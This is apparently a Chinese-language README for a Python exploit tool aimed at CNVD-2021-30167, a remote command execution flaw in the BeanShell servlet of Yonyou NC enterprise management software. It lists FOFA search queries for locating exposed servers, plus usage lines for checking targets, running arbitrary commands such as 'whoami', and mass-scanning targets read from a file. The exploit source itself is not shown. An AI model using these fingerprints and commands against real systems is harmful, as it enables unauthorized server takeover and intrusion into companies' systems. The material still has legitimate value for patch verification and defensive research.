# 用友NC BeanShell远程代码执行 

# CNVD-2021-30167

## 漏洞描述

用友NC是一款企业级管理软件，在大中型企业广泛使用。实现建模、开发、继承、运行、管理一体化的IT解决方案信息化平台。用友 NC bsh.[servlet](https://so.csdn.net/so/search?q=servlet&spm=1001.2101.3001.7020).BshServlet 存在远程命令执行漏洞，通过BeanShell 执行远程命令获取服务器权限。

## FOFA

```
title="YONYOU NC"
icon_hash="1085941792"
```

## 使用方法

```
python ./YONYOU-NC-RCE.py -u http://www.example.com --check
python ./YONYOU-NC-RCE.py -u http://www.example.com --cmd "whoami"
python ./YONYOU-NC-RCE.py -f target.txt

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     Start scanning url
  -f FILE, --file FILE  read the url from the file
  --check               Check if vulnerable
  --cmd CMD             execute cmd (i.e: "ls -l")
```

